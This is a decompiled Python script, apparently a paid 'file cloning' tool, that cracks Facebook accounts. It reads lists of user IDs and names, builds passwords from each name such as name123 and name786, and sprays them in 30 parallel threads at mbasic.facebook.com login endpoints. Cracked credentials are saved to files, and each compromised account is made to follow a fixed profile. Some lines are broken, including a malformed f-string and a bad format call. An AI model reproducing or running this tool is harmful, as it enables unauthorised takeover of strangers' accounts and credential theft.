#https://github.com/ZM-HERO/MBx
# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-04-22 10:18:31.546639
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as malikzari
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;95m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
   \033[1;36m   
\033[1;33m███████  █████  ██████  ██ 
\033[1;32m   ███  ██   ██ ██   ██ ██ 
 \033[1;31m ███   ███████ ██████  ██ 
\033[1;33m ███    ██   ██ ██   ██ ██ 
\033[1;32m███████ ██   ██ ██   ██ ██ 
                      
\x1b[1;95m======================\x1b[1;95m======================
\033[1;31m\033[1;37m[\033[1;32m+\033[1;37m] \033[1;33mAUTHOR   \x1b[1;91m : \033[1;32m       Zari Malik
\033[1;31m\033[1;37m[\033[1;32m+\033[1;37m] \033[1;33mFACEBOOK  \x1b[1;91m: \033[1;32m       Zari Malik
\033[1;31m\033[1;37m[\033[1;32m+\033[1;37m] \033[1;33mGITHUB  \x1b[1;91m  : \033[1;32m       ZM-HERO
\033[1;31m\033[1;37m[\033[1;32m+\033[1;37m] \033[1;33mVERSION  \x1b[1;91m : \033[1;32m        0.1
\033[1;35m======================\033[1;35m======================

\033[1;37m  """

                                              
def mbx_buy():
    imt = '+MALIK=='
    os.system('clear')
    print(logo)
    try:
        key1 = open('/sdcard/Download/.mmbbxx.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        print( '           You dont have subscrption')
        print( '           Hello Dear Ya Cammonds Paid Han Or')
        print ('           Ap Ke Subscription Nhi Ha Please Ap')
        print( '           Admin Sa Rabta Kran Thanks')
        print ('           Subscription Kelya Enter Press Kro')
        print ('           Or Whatsapp Pa Rabta Kro Thanks')
        print( '')
        myid = ''.join((random.choice('abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')) for x in range(50))
        print( '         YOUR KEY : ' + myid + imt)
        kok = open('/sdcard/Download/.mmbbxx.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ('')
        print ('           Ya Uper Wale Ap Ke KEY Ha')
        print ('           Copy Kar Ka WhatsApp Pa Bhaj Dena')
        print('')
        print ('')
        print ('')
        print ('             Agar Ap Na Subscription Kar Le Ha To')
        input('  Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio Thanks')
        os.system('xdg-open https://www.facebook.com/ZM.777.HERO')
        mbx_buy()
 
    r1 = requests.get('https://pastebin.com/raw/JJgME4Mv').text
    if key1 in r1:
        mbx_aprv()
    else:
        os.system('clear')
        print( logo)
        print('')
        print('\033[1;31m           YOUR  TOKEN  IS NOT  APPROVED')
        print('           ')
        print('           ')
        print('           ')
        print('')
        print('\033[1;37mYOUR TOKEN\033[1;31m : \033[1;32m' + key1)
        print('')
        print('           ')
        print('        \033[1;31mCOPY THIS TOKEN AND SEND OWNER FOR APROVE   ')
        print('')
        print('')
        print('')
        print('             ')
        input('\033[1;33m  PRESS ENTER TO CONTACT OWNER ')
        os.system('xdg-open https://www.facebook.com/ZM.777.HERO')
        mbx_buy()
        
        
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mZari_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mZari_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Zari Menu ")
	    mbx_aprv()

def mbx_aprv():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print('\033[1;37m {\033[1;32m1\033[1;37m} Start File Cloning')
    print('\033[1;37m {\033[1;32m2\033[1;37m} Create File ')
    print('\033[1;37m {\033[1;31m0\033[1;37m} \033[1;31mExit ')
    print('')
    _malik___ = input(' \033[1;37m[\033[1;31m?\033[1;37m] \033[1;32mChoose option : ')
    if _malik___ in ('1', '01'):
        __xxx__().malikx(id)
    if _malik___ in ('2', '02'):
        os.system('python2 XOX')
        time.sleep(3)
    if _malik___ in ('E', 'ee'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def malikx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('\033[1;31mPut File Name :\033[1;37m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print('\033[1;37m [\033[1;31m!\033[1;37m] \033[1;31mChoose Correct One');
            self.malikx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97mZari {loop}|{len(self.id)} ok>>>[{len(ok)}] | cp>>>[{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = True)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} {Zari-OK} {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Zari_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s {Zari-CP} %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Zari_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s {Zari-CP} %s | %s ' % (O, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('Zari_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('\033[1;37m[\033[1;32m1\033[1;37m] Crack With Auto Pass ')
        print('\033[1;37m[\033[1;32m2\033[1;37m] Crack With Name Digit Pass')
        chi = input('\n\033[1;37m [\033[1;31m?\033[1;37m] \033[1;32mChoose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print(47*"=")
            print('')
            print('\033[1;32m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;32m Cracking Started...')
            print('\033[1;37m')
            print("\x1b[0;90m\x1b[1;47m          USE AIRPLANE MODE FOR 5 SEC          \x1b[0m")
            print(47*"=")
            with malikzari(max_workers=30) as zariworld:
                for mbx in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = mbx.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"786"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"786"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"786"]
                            zariworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\x1b[0;91m\x1b[1;47mUSE AIRPLANE MODE FOR 5 SEC\x1b[0m\n")
            print('\033[1;37m')
            print(47*"=")
            print('')
            print('\033[1;32m Total IDs : %s ' % len(self.id))
            print('\033[1;32m Cracking Started...')
            print('\033[1;37m')
            print(47*"=")
            with malikzari(max_workers=30) as zariworld:
                for mbx in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = mbx.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        zariworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()
            

def zm_hero():
	os.system('git pull')
	time.sleep(2)
	os.system ('clear')
	print('')
	print('')
	print('CHUTI KR MERA PUTER')
	print('')
	sys.exit

	
	

    
mbx_aprv()
	
	
	
    
    

